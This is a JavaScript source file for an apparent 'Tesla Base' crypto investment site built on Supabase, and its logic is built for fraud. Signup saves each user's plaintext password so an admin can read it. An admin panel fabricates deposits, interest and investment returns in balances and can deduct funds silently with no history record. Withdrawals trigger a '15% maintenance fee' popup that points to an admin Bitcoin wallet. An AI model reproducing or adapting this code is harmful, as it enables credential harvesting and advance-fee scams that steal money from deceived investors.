// TESLA BASE - MASTER LOGIC
const SUPABASE_URL = 'https://ggrvkcxnizchfbzfwvjv.supabase.co'; 
const SUPABASE_KEY = 'YOUR_ACTUAL_LONG_ANON_KEY_HERE'; // Put your full key here
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

// --- 1. AUTHENTICATION ---
async function handleAuth(type) {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    if (type === 'signup') {
        const { data, error } = await _supabase.auth.signUp({ email, password });
        if (error) return alert(error.message);
        
        // Save to profiles so Admin can see email/password
        await _supabase.from('profiles').insert([
            { id: data.user.id, email: email, password: password, balance: 0 }
        ]);
        alert("Account Created!");
    } else {
        const { data, error } = await _supabase.auth.signInWithPassword({ email, password });
        if (error) return alert("Login Failed");
        window.location.href = (email === 'admin@tesla.com') ? 'admin.html' : 'dashboard.html';
    }
}

// --- 2. ADMIN INJECT/DEDUCT LOGIC ---
async function adminAction(actionType) {
    const targetEmail = document.getElementById('target-user').value;
    const amount = parseFloat(document.getElementById('inject-amount').value);
    
    // Get user ID first
    const { data: userData } = await _supabase.from('profiles').select('*').eq('email', targetEmail).single();
    if (!userData) return alert("User not found");

    let newBalance = userData.balance;
    let historyType = "";

    if (actionType === 'deposit') {
        newBalance += amount;
        historyType = "Deposit Successful";
    } else if (actionType === 'interest') {
        newBalance += amount;
        historyType = "Interest";
    } else if (actionType === 'return') {
        newBalance += amount;
        historyType = "Investment Return";
    } else if (actionType === 'deduct') {
        newBalance -= amount;
        // No historyType assigned = No trace in history
    }

    // Update Balance
    await _supabase.from('profiles').update({ balance: newBalance }).eq('email', targetEmail);

    // Record in History (Except for silent deduct)
    if (historyType !== "") {
        await _supabase.from('history').insert([
            { user_id: userData.id, type: historyType, amount: amount, status: 'Success' }
        ]);
    }
    alert("Action Completed Successfully");
}

// --- 3. WITHDRAWAL LOGIC ---
function requestWithdrawal() {
    const amount = document.getElementById('withdraw-amount').value;
    if (amount < 3500) {
        alert("Minimum withdrawal is $3,500");
    } else {
        // Show the 15% maintenance fee popup
        document.getElementById('fee-popup').style.display = 'block';
        // Get the current BTC wallet from Admin settings
        loadAdminWallet();
    }
}

async function loadAdminWallet() {
    const { data } = await _supabase.from('admin_settings').select('btc_address').single();
    document.getElementById('display-admin-btc').innerText = data.btc_address;
}

// --- 4. LOGOUT ---
function logout() {
    _supabase.auth.signOut();
    window.location.href = 'index.html';
}
